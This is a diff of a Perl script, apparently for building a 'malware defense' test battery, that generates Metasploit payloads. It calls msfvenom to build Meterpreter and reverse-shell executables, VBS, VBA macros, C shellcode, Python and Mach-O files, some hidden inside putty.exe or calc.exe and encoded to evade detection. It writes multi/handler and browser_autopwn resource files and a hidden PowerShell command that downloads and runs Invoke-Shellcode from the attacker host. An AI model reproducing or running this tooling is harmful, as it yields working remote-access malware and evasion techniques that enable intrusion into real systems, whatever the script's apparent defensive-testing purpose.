@@ -14,15 +14,12 @@ use warnings;
   $PROJECT = shift or die "Expecting a Project Name in arg 3"; 
   $PROJECTNUM = shift or die "Expecting a Project Number in arg 4";
  
-
+  #define the target folder and ensure it exists
   $targetFolder="/opt/malwaredefense/current";
   `mkdir -p $targetFolder`;
  
   $fileNdx=0;
-  $payload = '-p windows/meterpreter/reverse_tcp';
-  $platform_arch = '--platform win -ax86';
   $commandControl = "lhost=$LHOST lport=$LPORT";
-  $encoder = "-e generic/none";
 
   #archive the old version
   ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst) = localtime();
@@ -33,49 +30,75 @@ use warnings;
 
   ###################
   ##
-  ##  Basic Delivery
+  ##  32 bit Basic Delivery
   ##
   ##################
 
-  `touch $targetFolder/000-StartMSF900.cue`; 
-  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe  > $targetFolder/001-${PROJECT}-${PROJECTNUM}-BasicMeterpreter-32.exe";
+  `touch $targetFolder/000-StartMSF900.cue`;
+  $payload = 'windows/meterpreter/reverse_tcp';
+  $platform_arch = '--platform win -ax86';
+  $encoder = "-e generic/none";
+
+
+  open( $OUTFILE, '>', "$targetFolder/900-reverse_tcp_noenc-32.rc");
+print $OUTFILE <<TCPNOENC;
+use multi/handler
+set payload $payload
+set LHOST $LHOST
+set LPORT $LPORT
+set ExitOnSession false
+set EnableStageEncoding false
+exploit -j
+TCPNOENC
+  close $OUTFILE;
+
+ 
+  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe  > $targetFolder/001-${PROJECT}-${PROJECTNUM}-BasicMeterpreter-32.exe";
   print "\n\n*** Most Basic Meterpreter: $cmd";
   `$cmd`;
 
 
-  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl} -x ./inc/putty.exe -k -f exe $encoder > $targetFolder/002-${PROJECT}-${PROJECTNUM}-Meterpreter-packed-putty-32.exe";
+  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -x ./inc/putty.exe -k -f exe $encoder > $targetFolder/002-${PROJECT}-${PROJECTNUM}-BasicMeterpreter-packed-putty-32.exe";
   print "\n\n*** Meterpreter packed into putty: $cmd \n";
   `$cmd`;
 
   
-  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/003-${PROJECT}-${PROJECTNUM}-Meterpreter-32.vbs";
+  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/003-${PROJECT}-${PROJECTNUM}-BasicMeterpreter-32.vbs";
   print "\n\n*** Meterpreter vbs  (Download and pass as arg to cscript): $cmd \n";
   `$cmd`;
 
-  $cmd ="msfvenom ${payload} ${platform_arch} ${commandControl} -f vba $encoder > $targetFolder/004-${PROJECT}-${PROJECTNUM}-Meterpreter-32.vba";
+  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vba $encoder > $targetFolder/004-${PROJECT}-${PROJECTNUM}-BasicMeterpreter-32.vba";
   print "\n\n*** Meterpreter vba  (Paste into Excel Macro): $cmd\n";
   `$cmd`;
 
 
+
+
+
+
   ###################
   ##
-  ##  Basic Delivery + Encoding
+  ##  32 bit Basic Delivery + Encoding
   ##
   ##################
-
+  
   $encoder = '-e x86/shikata_ga_nai -i 17 -b "\x00\xFF" ';
+  $payload = 'windows/meterpreter/reverse_tcp';
+  $platform_arch = '--platform win -ax86';
+  
+  #continue to use previous listener
 
-  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe  > $targetFolder/011-${PROJECT}-${PROJECTNUM}-BasicMeterpreter-32enc.exe";
+  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe  > $targetFolder/011-${PROJECT}-${PROJECTNUM}-BasicMeterpreter-32enc.exe";
   print "\n\n*** Most Basic Meterpreter: $cmd";
   `$cmd`;
 
 
-  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl} -x ./inc/putty.exe -k -f exe $encoder > $targetFolder/012-${PROJECT}-${PROJECTNUM}-Meterpreter-packed-putty-32enc.exe";
+  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -x ./inc/putty.exe -k -f exe $encoder > $targetFolder/012-${PROJECT}-${PROJECTNUM}-BasicMeterpreter-packed-putty-32enc.exe";
   print "\n\n*** Meterpreter packed into putty: $cmd \n";
   `$cmd`;
 
 
-   $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/013-${PROJECT}-${PROJECTNUM}-Meterpreter-32enc.vbs";
+   $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/013-${PROJECT}-${PROJECTNUM}-BasicMeterpreter-32enc.vbs";
    print "\n\n*** Meterpreter vbs  (Download and pass as arg to cscript): $cmd \n";
   `$cmd`;
 
@@ -83,84 +106,326 @@ use warnings;
   #tuning encoder down to 1 for VBA
   #consistently had issues with this running.
   $encoder = '-e x86/shikata_ga_nai -i 1 -b "\x00\xFF" ';
-  $cmd ="msfvenom ${payload} ${platform_arch} ${commandControl} -f vba $encoder  > $targetFolder/014-${PROJECT}-${PROJECTNUM}-Meterpreter-32enc.vba";
+  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vba $encoder  > $targetFolder/014-${PROJECT}-${PROJECTNUM}-BasicMeterpreter-32enc.vba";
   print "\n\n*** Meterpreter vba  (Paste into Excel Macro): $cmd\n";
   `$cmd`;
 
   `touch $targetFolder/050-${PROJECT}-${PROJECTNUM}-RepeatWith905.cue`;
 
+ open( $OUTFILE, '>', "$targetFolder/905-reverse_tcp-enc-32.rc");
+print $OUTFILE <<TCPENC;
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST $LHOST
+set LPORT $LPORT
+set ExitOnSession false
+set EnableStageEncoding true
+exploit -j
+TCPENC
+  close $OUTFILE;
+
+
+
+
+
 
 
   ###################
   ##
-  ##  64bit Delivery 
+  ##  32 bit Stageless Delivery
+  ##
+  ##################
+
+  `touch $targetFolder/060-StartMSF980.cue`;
+  $payload = "windows/meterpreter_reverse_tcp";
+  $encoder = "";
+  $platform_arch = '--platform win -ax86';
+
+  open( $OUTFILE, '>', "$targetFolder/980-stageless-reverse_tcp-enc-32.rc");
+print $OUTFILE <<TCPSTAGELESS32;
+use multi/handler
+set payload $payload
+set LHOST $LHOST
+set LPORT $LPORT
+set ExitOnSession false
+exploit -j
+TCPSTAGELESS32
+  close $OUTFILE;
+
+
+  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe  > $targetFolder/061-${PROJECT}-${PROJECTNUM}-StagelessMeterpreter-32.exe";
+  print "\n\n*** Most Basic Meterpreter: $cmd";
+  `$cmd`;
+
+
+  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -x ./inc/putty.exe -k -f exe $encoder > $targetFolder/062-${PROJECT}-${PROJECTNUM}-StagelessMeterpreter-packed-putty-32.exe";
+  print "\n\n*** Meterpreter packed into putty: $cmd \n";
+  `$cmd`;
+
+
+  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/063-${PROJECT}-${PROJECTNUM}-StaglessMeterpreter-32.vbs";
+  print "\n\n*** Meterpreter vbs  (Download and pass as arg to cscript): $cmd \n";
+  `$cmd`;
+
+  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vba $encoder > $targetFolder/064-${PROJECT}-${PROJECTNUM}-StagelessMeterpreter-32.vba";
+  print "\n\n*** Meterpreter vba  (Paste into Excel Macro): $cmd\n";
+  `$cmd`;
+
+
+  ###################
+  ##
+  ##  32 bit Stageless Delivery + Encoding
+  ##
+  ##################
+  $encoder = '-e x86/shikata_ga_nai -i 17 -b "\x00\xFF" ';
+  $payload = 'windows/meterpreter_reverse_tcp';
+
+  #continue using previous listener
+  
+  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe  > $targetFolder/071-${PROJECT}-${PROJECTNUM}-StagelessMeterpreter-32enc.exe";
+  print "\n\n*** Most Basic Meterpreter: $cmd";
+  `$cmd`;
+
+
+  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -x ./inc/putty.exe -k -f exe $encoder > $targetFolder/072-${PROJECT}-${PROJECTNUM}-StagelessMeterpreter-packed-putty-32enc.exe";
+  print "\n\n*** Meterpreter packed into putty: $cmd \n";
+  `$cmd`;
+
+
+   $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/073-${PROJECT}-${PROJECTNUM}-StagelessMeterpreter-32enc.vbs";
+   print "\n\n*** Meterpreter vbs  (Download and pass as arg to cscript): $cmd \n";
+  `$cmd`;
+
+
+  #tuning encoder down to 1 for VBA
+  #consistently had issues with this running.
+  $encoder = '-e x86/shikata_ga_nai -i 1 -b "\x00\xFF" ';
+  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vba $encoder  > $targetFolder/074-${PROJECT}-${PROJECTNUM}-StagelessMeterpreter-32enc.vba";
+  print "\n\n*** Meterpreter vba  (Paste into Excel Macro): $cmd\n";
+  `$cmd`;
+
+
+
+
+
+
+  ###################
+  ##
+  ##  64bit Basic Delivery 
   ##
   ##################
 
 
   $platform_arch = '--platform win -ax86_64';
-  $payload = '-p windows/x64/meterpreter/reverse_tcp';
+  $payload = 'windows/x64/meterpreter/reverse_tcp';
   $encoder = ''; 
   
-  `touch $targetFolder/100-StartMSF910.cue`; 
+  `touch $targetFolder/100-StartMSF910.cue`;
 
-  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe-only  > $targetFolder/101-${PROJECT}-${PROJECTNUM}-BasicMeterpreter-64.exe";
+
+  open( $OUTFILE, '>', "$targetFolder/910-reverse_tcp-noenc-64.rc");
+print $OUTFILE <<TCPNOENC64;
+use multi/handler
+set payload $payload
+set LHOST $LHOST
+set LPORT $LPORT
+set ExitOnSession false
+set EnableStageEncoding false
+exploit -j
+TCPNOENC64
+  close $OUTFILE;
+ 
+
+  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe-only  > $targetFolder/101-${PROJECT}-${PROJECTNUM}-BasicMeterpreter-64.exe";
   print "\n\n*** Most Basic Meterpreter: $cmd";
   `$cmd`;
 
 
-  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl} -x ./inc/calc.exe -k -f exe-only $encoder > $targetFolder/102-${PROJECT}-${PROJECTNUM}-Meterpreter-packed-calc-64.exe";
+  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -x ./inc/calc.exe -k -f exe-only $encoder > $targetFolder/102-${PROJECT}-${PROJECTNUM}-Meterpreter-packed-calc-64.exe";
   print "\n\n*** Meterpreter packed into putty: $cmd \n";
   `$cmd`;
 
 
-  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/103-${PROJECT}-${PROJECTNUM}-Meterpreter-64.vbs";
+  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/103-${PROJECT}-${PROJECTNUM}-Meterpreter-64.vbs";
   print "\n\n*** Meterpreter vbs  (Download and pass as arg to cscript): $cmd \n";
   `$cmd`;
 
-  $cmd ="msfvenom ${payload} ${platform_arch} ${commandControl} -f vba $encoder > $targetFolder/104-${PROJECT}-${PROJECTNUM}-Meterpreter-64.vba";
+  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vba $encoder > $targetFolder/104-${PROJECT}-${PROJECTNUM}-Meterpreter-64.vba";
   print "\n\n*** Meterpreter vba  (Paste into Excel Macro): $cmd\n";
   `$cmd`;
 
   ###################
   ##
-  ##  64bit Delivery + Encoding
+  ##  64bit Basic Delivery + Encoding
   ##
   ##################
 
   $encoder ='-e x64/xor -i 3';
+  $payload = 'windows/x64/meterpreter/reverse_tcp';
 
-  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe-only  > $targetFolder/111-${PROJECT}-${PROJECTNUM}-BasicMeterpreter-64enc.exe";
+  #Continue using previous listener
+
+  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe-only  > $targetFolder/111-${PROJECT}-${PROJECTNUM}-BasicMeterpreter-64enc.exe";
   print "\n\n*** Most Basic Meterpreter: $cmd";
   `$cmd`;
 
 
-  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl} -x ./inc/calc.exe -k -f exe-only $encoder > $targetFolder/112-${PROJECT}-${PROJECTNUM}-Meterpreter-packed-calc-64enc.exe";
+  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -x ./inc/calc.exe -k -f exe-only $encoder > $targetFolder/112-${PROJECT}-${PROJECTNUM}-PackedMeterpreter-calc-64enc.exe";
   print "\n\n*** Meterpreter packed into putty: $cmd \n";
   `$cmd`;
 
 
-  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/113-${PROJECT}-${PROJECTNUM}-Meterpreter-64enc.vbs";
+  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/113-${PROJECT}-${PROJECTNUM}-Meterpreter-64enc.vbs";
   print "\n\n*** Meterpreter vbs  (Download and pass as arg to cscript): $cmd \n";
   `$cmd`;
 
-  $cmd ="msfvenom ${payload} ${platform_arch} ${commandControl} -f vba $encoder > $targetFolder/114-${PROJECT}-${PROJECTNUM}-Meterpreter-64enc.vba";
+  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vba $encoder > $targetFolder/114-${PROJECT}-${PROJECTNUM}-Meterpreter-64enc.vba";
   print "\n\n*** Meterpreter vba  (Paste into Excel Macro): $cmd\n";
   `$cmd`;
 
 
-  $cmd ="msfvenom ${payload} ${platform_arch} ${commandControl} -f c $encoder > $targetFolder/115-${PROJECT}-${PROJECTNUM}-CShellCode-64enc.c";
+  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f c $encoder > $targetFolder/115-${PROJECT}-${PROJECTNUM}-CShellCode-64enc.c";
   print "\n\n*** Meterpreter vba  C Shell Code: $cmd\n";
   `$cmd`;
   `cp ./inc/meterpreter_x64.c $targetFolder/115-${PROJECT}-${PROJECTNUM}-MeterpreterTemplate.c`;
   `echo "#!/bin/sh" >$targetFolder/115-${PROJECT}-${PROJECTNUM}-MeterpreterGen.sh`;
   `echo "x86_64-w64-mingw32-gcc 115-${PROJECT}-${PROJECTNUM}-MeterpreterTemplate.c  -o 115-${PROJECT}-${PROJECTNUM}-Meterpreter-CustomTemplate.exe" >>$targetFolder/115-${PROJECT}-${PROJECTNUM}-MeterpreterGen.sh`;
-  `chmod +x i$targetFolder/115-${PROJECT}-${PROJECTNUM}-MeterpreterGen.sh`;
+  `chmod +x $targetFolder/115-${PROJECT}-${PROJECTNUM}-MeterpreterGen.sh`;
 
-  #Original: msfvenom --platform win -ax86_64 -e x64/xor -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.109 LPORT=443 -f c >shellcode.c 2>&1
 
   `touch $targetFolder/150-${PROJECT}-${PROJECTNUM}-RepeatWith915.cue`;
 
+
+
+
+  open( $OUTFILE, '>', "$targetFolder/915-reverse_tcp-enc-64.rc");
+print $OUTFILE <<TCPENC64;
+use multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST $LHOST
+set LPORT $LPORT
+set ExitOnSession false
+set EnableStageEncoding true
+exploit -j
+TCPENC64
+  close $OUTFILE;
+
+
+
+  ###################
+  ##
+  ##  64bit Stageless Delivery
+  ##
+  ##################
+
+
+  $platform_arch = '--platform win -ax86_64';
+  $payload = 'windows/x64/meterpreter_reverse_tcp';
+  $encoder = '';
+
+  `touch $targetFolder/160-StartMSF990.cue`;
+
+  open( $OUTFILE, '>', "$targetFolder/990-stageless-reverse_tcp-enc-64.rc");
+print $OUTFILE <<TCPSTAGELESS64;
+use multi/handler
+set payload windows/x64/meterpreter_reverse_tcp
+set LHOST $LHOST
+set LPORT $LPORT
+set ExitOnSession false
+exploit -j
+TCPSTAGELESS64
+  close $OUTFILE;
+
+
+
+  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe-only  > $targetFolder/161-${PROJECT}-${PROJECTNUM}-BasicMeterpreter-64.exe";
+  print "\n\n*** Most Basic Meterpreter: $cmd";
+  `$cmd`;
+
+
+  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -x ./inc/calc.exe -k -f exe-only $encoder > $targetFolder/162-${PROJECT}-${PROJECTNUM}-Meterpreter-packed-calc-64.exe";
+  print "\n\n*** Meterpreter packed into putty: $cmd \n";
+  `$cmd`;
+
+
+  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/163-${PROJECT}-${PROJECTNUM}-Meterpreter-64.vbs";
+  print "\n\n*** Meterpreter vbs  (Download and pass as arg to cscript): $cmd \n";
+  `$cmd`;
+
+  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vba $encoder > $targetFolder/164-${PROJECT}-${PROJECTNUM}-Meterpreter-64.vba";
+  print "\n\n*** Meterpreter vba  (Paste into Excel Macro): $cmd\n";
+  `$cmd`;
+
+
+  ###################
+  ##
+  ##  64bit Stageless Delivery + Encoding
+  ##
+  ##################
+
+  $encoder ='-e x64/xor -i 3';
+  $payload = 'windows/x64/meterpreter_reverse_tcp';
+
+  #Continue using previous listener
+
+  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe-only  > $targetFolder/171-${PROJECT}-${PROJECTNUM}-StagelessMeterpreter-64enc.exe";
+  print "\n\n*** Most Basic Meterpreter: $cmd";
+  `$cmd`;
+
+
+  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -x ./inc/calc.exe -k -f exe-only $encoder > $targetFolder/172-${PROJECT}-${PROJECTNUM}-PackedStagelessMeterpreter-calc-64enc.exe";
+  print "\n\n*** Meterpreter packed into putty: $cmd \n";
+  `$cmd`;
+
+
+  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/173-${PROJECT}-${PROJECTNUM}-StagelessMeterpreter-64enc.vbs";
+  print "\n\n*** Meterpreter vbs  (Download and pass as arg to cscript): $cmd \n";
+  `$cmd`;
+
+  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vba $encoder > $targetFolder/174-${PROJECT}-${PROJECTNUM}-StagelessMeterpreter-64enc.vba";
+  print "\n\n*** Meterpreter vba  (Paste into Excel Macro): $cmd\n";
+  `$cmd`;
+
+
+  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f c $encoder > $targetFolder/175-${PROJECT}-${PROJECTNUM}-CShellCode-64enc.c";
+  print "\n\n*** Meterpreter vba  C Shell Code: $cmd\n";
+  `$cmd`;
+  `cp ./inc/meterpreter_x64.c $targetFolder/175-${PROJECT}-${PROJECTNUM}-StagelessMeterpreterTemplate.c`;
+  `echo "#!/bin/sh" >$targetFolder/175-${PROJECT}-${PROJECTNUM}-StagelessMeterpreterGen.sh`;
+  `echo "x86_64-w64-mingw32-gcc 175-${PROJECT}-${PROJECTNUM}-StagelessMeterpreterTemplate.c  -o 175-${PROJECT}-${PROJECTNUM}-StagelessMeterpreter-CustomTemplate.exe" >>$targetFolder/175-${PROJECT}-${PROJECTNUM}-StagelessMeterpreterGen.sh`;
+  `chmod +x i$targetFolder/175-${PROJECT}-${PROJECTNUM}-StagelessMeterpreterGen.sh`;
+
+
+  $payload = 'windows/x64/meterpreter/reverse_tcp';
+
+
+
+
+
+
+
+
+
+
+
+  ###################
+  ##
+  ##  Powershell HTTPS
+  ##
+  ##################
+
+  `touch $targetFolder/200-${PROJECT}-${PROJECTNUM}-Run950.cue`;
+  open( $OUTFILE, '>', "$targetFolder/950-reversehttps.rc");
+print $OUTFILE <<RHTTPSNOENC;
+use multi/handler
+set payload windows/meterpreter/reverse_https
+set LHOST $LHOST
+set LPORT $LPORT
+set ExitOnSession false
+set EnableStageEncoding false
+exploit -j
+RHTTPSNOENC
+  close $OUTFILE;
 
 
   print "Copy the Invoke-shellcode.ps1 to the target directory \n";
@@ -172,17 +437,53 @@ use warnings;
     print "Installing PowerSploit now in /opt/ \n";
     `cd /opt/ && git clone https://github.com/mattifestation/PowerSploit.git > /dev/null 2>&1 && cd /opt/PowerSploit/ && wget -q https://raw.githubusercontent.com/obscuresec/random/master/StartListener.py && wget -q https://raw.githubusercontent.com/darkoperator/powershell_scripts/master/ps_encoder.py`;
   }
-  `touch $targetFolder/200-${PROJECT}-${PROJECTNUM}-Run950.cue`;
-  my ($ShellCodePath) ="./701_Invoke-Shellcode.ps1";
-  `cp $ShellCodePath $targetFolder/701_Invoke-Shellcode.ps1`;
-  `echo Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost $LHOST -Lport $LPORT -Force >> $targetFolder/701_Invoke-Shellcode.ps1`;
-  $cmd = "powershell.exe -NoP -NonI -w HIDDEN -c IEX((New-Object Net.WebClient).DownloadString('http://$LHOST/200_Invoke-Shellcode.ps1'))";
+  my ($ShellCodePath) ="./inc/Invoke-Shellcode.ps1";
+  `cp $ShellCodePath $targetFolder/202_Invoke-Shellcode.ps1`;
+  `echo Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost $LHOST -Lport $LPORT -Force >> $targetFolder/201_Invoke-Shellcode.ps1`;
+  $cmd = "powershell.exe -NoP -NonI -w HIDDEN -c IEX((New-Object Net.WebClient).DownloadString('http://$LHOST/202-Invoke-Shellcode.ps1'))";
   open( $OUTFILE, '>', "$targetFolder/201_PScommand.txt");
   print $OUTFILE $cmd;
   close $OUTFILE;
 
+
+
+  ###################
+  ##
+  ##  Browser Autopwn
+  ##
+  ##################
+
+
   `touch $targetFolder/300-${PROJECT}-${PROJECTNUM}-run960.cue`;
+
+  open( $OUTFILE, '>', "$targetFolder/960-browserautopwn1.rc");
+print $OUTFILE <<BAPENC;
+use auxiliary/server/browser_autopwn
+set SRVHOST $LHOST
+set SRVPORT 8080
+format(lhost)
+set URIPATH qrq
+set EnableStageEncoding true
+exploit
+BAPENC
+  close $OUTFILE;
+
+
+
+
+
+
   `touch $targetFolder/300-${PROJECT}-${PROJECTNUM}-run965.cue`;
+  open( $OUTFILE, '>', "$targetFolder/965-browserautopwn2.rc");
+print $OUTFILE <<BAPENC2;
+use auxiliary/server/browser_autopwn2
+set SRVHOST $LHOST
+set SRVPORT 8080
+format(lhost)
+set URIPATH qrq
+set EnableStageEncoding true
+exploit
+BAPENC2
 
 
   ###################
@@ -191,12 +492,32 @@ use warnings;
   ##
   ##################
  
- `touch $targetFolder/400-${PROJECT}-${PROJECTNUM}-run970.cue`;
 
   $platform_arch = "--platform Python -a python";
   $encoder = "-e generic/none";
-  $payload = "-p python/meterpreter/reverse_tcp";
-  $cmd ="msfvenom ${payload} ${platform_arch} ${commandControl} $encoder > $targetFolder/401-${PROJECT}-${PROJECTNUM}-Meterpreter-python.py";
+  $payload = "python/meterpreter/reverse_tcp";
+
+
+
+
+
+ `touch $targetFolder/400-${PROJECT}-${PROJECTNUM}-run970.cue`;
+  open( $OUTFILE, '>', "$targetFolder/970-pythonreverse_tcp.rc");
+print $OUTFILE <<PYRTCP;
+use multi/handler
+set payload $payload
+set LHOST $LHOST
+set LPORT $LPORT
+set ExitOnSession false
+set EnableStageEncoding true
+exploit -j
+PYRTCP
+  close $OUTFILE;
+
+
+
+
+  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} $encoder > $targetFolder/401-${PROJECT}-${PROJECTNUM}-Meterpreter-python.py";
   print "\n\n*** Meterpreter python: $cmd\n";
   `$cmd`;
   #original: msfvenom -e generic/none --platform Python -a python -p python/meterpreter/reverse_tcp LHOST=192.168.1.109 LPORT=443 >400-${PROJECT}-${PROJECTNUM}-Python.py
@@ -209,12 +530,26 @@ use warnings;
   ##
   ##################
 
- `touch $targetFolder/500-${PROJECT}-${PROJECTNUM}-run975.cue`;
 
   $platform_arch = "--platform OSX -a x86";
   $encoder = '-e generic/none -b "\x00"';
-  $payload = "-p osx/x86/shell_reverse_tcp";
-  $cmd ="msfvenom ${payload} ${platform_arch} ${commandControl} -f macho > $targetFolder/501-${PROJECT}-${PROJECTNUM}-shell.macho";
+  $payload = "osx/x86/shell_reverse_tcp";
+
+ `touch $targetFolder/500-${PROJECT}-${PROJECTNUM}-run975.cue`;
+  open( $OUTFILE, '>', "$targetFolder/975-MacShellReverseTCP.rc");
+print $OUTFILE <<MACSHELL1;
+use multi/handler
+set payload $payload
+set LHOST $LHOST
+set LPORT $LPORT
+set ExitOnSession false
+set EnableStageEncoding true
+exploit -j
+MACSHELL1
+  close $OUTFILE;
+
+
+  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f macho > $targetFolder/501-${PROJECT}-${PROJECTNUM}-shell.macho";
   print "\n\n*** Meterpreter mac: $cmd\n";
   `$cmd`;
 
@@ -228,7 +563,7 @@ use warnings;
   opendir (DIR, $targetFolder) or die $!;
   while (my $originalFile = readdir(DIR)) {
     $_ = $originalFile;
-    if (/cue$/ || /txt$/){next;}
+    if (/cue$/ || /txt$/ ||/sh$/ || /c$/ || /rc$/){next;}
     $maskedFile = $originalFile;
     $maskedFile =~ s/.$/_/;
     `cp $targetFolder/$originalFile $targetFolder/$maskedFile`; 
@@ -242,13 +577,17 @@ use warnings;
   ##  zip it up for USB/Download fast transfer
   ##
   ##################
-#  `zip -r $targetFolder/999-${PROJECT}-${PROJECTNUM}-Malware-CurrentBattery.zip $targetFolder/*`;
 
-
+  `cp /opt/eicar/eicar.com /opt/malwaredefense/current/0001-eicar.com`;
+  `cp /opt/eicar/eicar.com.txt /opt/malwaredefense/current/0002-eicar.com.txt`;
+  `cp /opt/eicar/eicar.com.txt /opt/malwaredefense/current/0003-eicar.com.jpg`;
+  `cp /opt/eicar/eicar_com.zip /opt/malwaredefense/current/0004-eicar.zip`;
+  `cp /opt/eicar/eicarcom2.zip /opt/malwaredefense/current/0005-eicar2.zip`;
+  `zip -r /opt/malwaredefense/current/999-$PROJECT-$PROJECTNUM-Malware-CurrentBattery.zip /opt/malwaredefense/current/*`;
 
 
  
 #Needs additional work
 #  print "\n\n*** Meterpreter Java  (Paste into Java and compile) \n";
-#  #`msfvenom ${payload} ${platform_arch} ${commandControl} -f java $encoder > ${currentFileName}.java`;
+#  #`msfvenom -p ${payload} ${platform_arch} ${commandControl} -f java $encoder > ${currentFileName}.java`;
 #  `msfvenom -p java/meterpreter/reverse_tcp ${platform_arch} ${commandControl} -f raw $encoder -o ${currentFileName}.jar`;
